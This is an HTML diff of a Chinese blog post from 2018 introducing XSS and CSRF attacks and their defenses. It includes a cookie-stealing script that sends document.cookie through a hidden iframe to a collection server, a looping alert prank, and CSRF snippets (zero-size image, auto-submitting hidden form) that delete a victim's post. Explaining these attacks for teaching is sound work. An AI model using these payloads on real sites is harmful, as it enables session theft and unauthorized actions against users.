@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Cai&#39;s</title>
+    <link rel="stylesheet" href="//cdn.bootcss.com/highlight.js/9.2.0/styles/github.min.css">
+    <script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script>
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+    <body>
+      <div class="container">
+        <header class="header">
+    <div class"blog-title">
+        <a href="/" class="logo">Cai&#39;s</a>
+    </div>
+    <nav class="navbar">
+        <ul class="menu">
+            
+                <li class="menu-item">
+                    <a class="menu-item-link" href="/"> 主页 </a>
+                </li>
+            
+                <li class="menu-item">
+                    <a class="menu-item-link" href="/archives"> 归档 </a>
+                </li>
+            
+                <li class="menu-item">
+                    <a class="menu-item-link" href="/tags"> 标签 </a>
+                </li>
+            
+                <li class="menu-item">
+                    <a class="menu-item-link" href="/categories"> 分类 </a>
+                </li>
+            
+                <li class="menu-item">
+                    <a class="menu-item-link" href="/about"> 简历 </a>
+                </li>
+            
+                <li class="menu-item">
+                    <a class="menu-item-link" href="https://github.com/caistrong"> Github </a>
+                </li>
+            
+        </ul>
+    </nav>
+</header>
+        <div class="main">
+          <article class="post">
+    <div class="post-title">
+        <h2 class="title"> XSS和CSRF浅析 </h2>
+    </div>
+    <div class="post-meta">
+        <span class="post-category">
+            <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/web安全/">web安全</a></li></ul>
+        </span>
+        <span class="post-tags">
+            <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/csrf/">csrf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/跨域/">跨域</a></li></ul>
+        </span>
+        <span class="post-time">
+            2018-01-31
+        </span>
+    </div>
+    <div class="post-content">
+        <p>web安全是一个广泛、复杂、深入的话题。其中跨站请求伪造CSRF(Cross-site request forgery)和跨站脚本攻击XSS(Cross-site Scripting)是web中很常见的两种威胁。这里我做一点最浅显的了解。<br><a id="more"></a></p>
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>XSS 全称“跨站脚本”，是注入攻击的一种。其特点是不对服务器端造成任何伤害，而是通过一些正常的站内交互途径，例如发布评论，提交含有 JavaScript 的内容文本。这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本。</p>
+<h3 id="XSS恶作剧"><a href="#XSS恶作剧" class="headerlink" title="XSS恶作剧"></a>XSS恶作剧</h3><p>假设在一篇博客的评论下注入以下代码</p>
+<pre><code class="js">//用 &lt;script type=&quot;text/javascript&quot;&gt;&lt;/script&gt; 包起来放在评论中
+while (true) {
+    alert(&quot;你关不掉我~&quot;);
+}
+</code></pre>
+<p>以后访问该博客的其他用户就会不断弹出关不掉的弹出窗口</p>
+<h3 id="XSS盗取cookie"><a href="#XSS盗取cookie" class="headerlink" title="XSS盗取cookie"></a>XSS盗取cookie</h3><p>在网页中注入的代码如下</p>
+<pre><code class="js">// 用 &lt;script type=&quot;text/javascript&quot;&gt;&lt;/script&gt; 包起来放在评论中
+(function(window, document) {
+    // 构造泄露信息用的 URL
+    var cookies = document.cookie;
+    var xssURIBase = &quot;http://192.168.123.123/myxss/&quot;;
+    var xssURI = xssURIBase + window.encodeURI(cookies);
+    // 建立隐藏 iframe 用于通讯
+    var hideFrame = document.createElement(&quot;iframe&quot;);
+    hideFrame.height = 0;
+    hideFrame.width = 0;
+    hideFrame.style.display = &quot;none&quot;;
+    hideFrame.src = xssURI;
+    // 开工
+    document.body.appendChild(hideFrame);
+})(window, document);
+</code></pre>
+<p>我们在192.168.123.123的服务器上就可以收集到发送上来的cookie信息</p>
+<p>于是每个访问到含有该评论的页面的用户都会遇到麻烦——他们不知道背后正悄悄的发起了一个请求，是他们所看不到的。而这个请求，会把包含了他们的帐号和其他隐私的信息发送到收集服务器上。</p>
+<h3 id="防范XSS"><a href="#防范XSS" class="headerlink" title="防范XSS"></a>防范XSS</h3><p>我们知道 <strong>AJAX 技术所使用的 XMLHttpRequest 对象都被浏览器做了限制，只能访问当前域名下的 URL，所谓不能“跨域”问题。这种做法的初衷也是防范 XSS</strong>，多多少少都起了一些作用，但不是总是有用，正如上面的注入代码，用 iframe 也一样可以达到相同的目的（因为iframe不受同源策略的限制）。甚至在愿意的情况下，我还能用 iframe 发起 POST 请求。当然，现在一些浏览器能够很智能地分析出部分 XSS 并予以拦截，例如新版的 Firefox、Chrome 都能这么做。但拦截不总是能成功，何况这个世界上还有大量根本不知道什么是浏览器的用户在用着可怕的 IE6。从原则上将，我们也不应该把事关安全性的责任推脱给浏览器，<strong>所以防止 XSS 的根本之道还是过滤用户输入</strong>。用户输入总是不可信任的，这点对于 Web 开发者应该是常识。</p>
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>CSRF 的全称是“跨站请求伪造”，而 XSS 的全称是“跨站脚本”。看起来有点相似，它们都是属于跨站攻击——不攻击服务器端而攻击正常访问网站的用户。CSRF 顾名思义，是伪造请求，冒充用户在站内的正常操作。<br>其实XSS和CSRF并不是两种毫无关系完全对立的手段。XSS可以是实现CSRF诸多途径中的一条。</p>
+<h3 id="CSRF删除别人的博文"><a href="#CSRF删除别人的博文" class="headerlink" title="CSRF删除别人的博文"></a>CSRF删除别人的博文</h3><p>在一个有安全缺陷的博客系统中。将设博客后端web应用程序的开发者采用如下途径来设计删除博文的功能</p>
+<pre><code class="html">//发送一个GET请求到&#39;small-min.blog.com/delete?id=123&#39;这个url
+&lt;a href=&quot;/delete?id=123&quot;&gt;删除&lt;/a&gt;
+//后端收到这个GET请求后，验证这个请求带的cookie里面的session id是不是这个id为123博文的作者
+//如果是的话，那就采取删除文章的操作
+</code></pre>
+<p>攻击者另外制作一个钓鱼网站（任意域名）里面有如下代码</p>
+<pre><code class="html">&lt;a href=&#39;https://small-min.blog.com/delete?id=123&#39;&gt;开始测验&lt;/a&gt;
+</code></pre>
+<p>这个时候假设博文的作者打开了钓鱼网站，并且点击了开始测验这个链接。浏览器就会发送一个GET请求给<a href="https://small-min.blog.com/delete?id=123" target="_blank" rel="noopener">https://small-min.blog.com/delete?id=123</a> 并且由于浏览器的运行机制。浏览器会一并把small-min.blog.com的cookie也带上去。服务端收到了这个请求，判断了cookie发现无误后就把这篇文章删除了。<br><strong>更高级的攻击代码</strong></p>
+<pre><code class="html">&lt;img src=&#39;https://small-min.blog.com/delete?id=123&#39; width=&#39;0&#39; height=&#39;0&#39; /&gt;
+&lt;a href=&#39;/test&#39;&gt;开始测验&lt;/a&gt;
+</code></pre>
+<p>博文的作者甚至不用点击开始测验。只要打开了这个钓鱼网站.那么他的博文就会被删除了。</p>
+<p>即使博客后端的设计人员认识到了使用GET来删除博文的危险性。将删除博文的机制由GET改成了POST<br><strong>CSRF攻击改为POST删除机制的博客系统</strong></p>
+<pre><code class="html">&lt;iframe style=&quot;display:none&quot; name=&quot;csrf-frame&quot;&gt;&lt;/iframe&gt;
+&lt;form method=&#39;POST&#39; action=&#39;https://small-min.blog.com/delete&#39; target=&quot;csrf-frame&quot; id=&quot;csrf-form&quot;&gt;
+  &lt;input type=&#39;hidden&#39; name=&#39;id&#39; value=&#39;123&#39;&gt;
+  &lt;input type=&#39;submit&#39; value=&#39;submit&#39;&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById(&quot;csrf-form&quot;).submit()&lt;/script&gt;
+</code></pre>
+<p>博文的作者只要打开了以上钓鱼网站，无需任何操作，自己的博文还是会被删除了</p>
+<p>假设博客后端的设计人员意识到了POST也不安全，按照RESTful的规范。把删除操作用DELETE这个HTTP Method来实现。那么暂时，我就找不到有什么html 标签可以被允许跨域发送DELETE请求了。如果攻击者打算在钓鱼网站注入Ajax请求代码来发起一个DELETE请求。那么不好意思，浏览器对Ajax有同源策略的限制。你的钓鱼网站的域名和博客系统的域名不在同一个源下。Ajax请求会被浏览器拦截。</p>
+<p>但是假设这个博客系统又存在另一个缺陷（没有对用户评论输入进行过滤）那么攻击者可以先通过XSS，往博客系统中的比如评论的页面注入了Ajax攻击代码。此时由于Ajax攻击代码所在的页面与博客系统同源，这时候浏览器就不对这个请求拦截。当博文作者打开了这个被注入攻击代码的页面时，Ajax代码执行。自己的博文又被攻击者删除了。</p>
+<h4 id="CSRF-Tokens"><a href="#CSRF-Tokens" class="headerlink" title="CSRF Tokens"></a>CSRF Tokens</h4><p>CSRF tokens是如何工作的呢？</p>
+<ol>
+<li>服务器发送给客户端一个token。</li>
+<li>客户端提交的表单中带着这个token。</li>
+<li>如果这个token不合法，那么服务器拒绝这个请求。<br>攻击者需要通过某种手段获取你站点的CSRF token,他们只能使用JavaScript来做。所以，如果你的站点不支持CORS，那么他们就没有办法来获取CSRF token，降低了威胁。</li>
+</ol>
+<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><p><a href="https://blog.techbridge.cc/2017/02/25/csrf-introduction/" target="_blank" rel="noopener">讓我們來談談 CSRF</a><br><a href="https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/" target="_blank" rel="noopener">总结 XSS 与 CSRF 两种跨站攻击</a><br><a href="https://www.jianshu.com/p/64f60ce328b9" target="_blank" rel="noopener">这里有一些防范CSRF的方法</a></p>
+
+    </div>
+</article>
+
+<!-- 由于这里是post的模板,所以page表示的是post的数据-->
+        </div>
+      </div>
+      <script>
+          hljs.initHighlightingOnLoad();
+      </script>
+    </body>
+</html>
